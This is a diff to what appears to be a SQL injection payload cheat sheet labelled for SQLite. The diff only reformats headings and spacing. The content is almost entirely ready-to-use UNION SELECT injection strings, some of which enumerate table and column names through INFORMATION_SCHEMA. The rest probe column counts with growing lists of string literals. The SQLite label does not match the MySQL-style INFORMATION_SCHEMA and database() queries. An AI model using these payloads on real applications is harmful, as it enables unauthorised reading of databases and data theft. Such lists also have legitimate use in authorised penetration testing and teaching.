@@ -1,9 +1,9 @@
 # For SQLi (SQLite)
-##### 0+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
-##### 0+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
-##### 0+UNION+SELECT+2,3,table_name,4+from+INFORMATION_SCHEMA.tables
-##### 0+UNION+SELECT+2,group_concat(table_name),3,4+from+INFORMATION_SCHEMA.TABLES
-##### 0+UNION+SELECT+2,3,group_concat(table_name),4+from+INFORMATION_SCHEMA.tables+where+table_SCHEMA=database()
+#### 0+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
+#### 0+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
+#### 0+UNION+SELECT+2,3,table_name,4+from+INFORMATION_SCHEMA.tables
+#### 0+UNION+SELECT+2,group_concat(table_name),3,4+from+INFORMATION_SCHEMA.TABLES
+#### 0+UNION+SELECT+2,3,group_concat(table_name),4+from+INFORMATION_SCHEMA.tables+where+table_SCHEMA=database()
 
 ' UNION SELECT NULL --
 
@@ -48,11 +48,20 @@
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's' --
 
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1' --
+
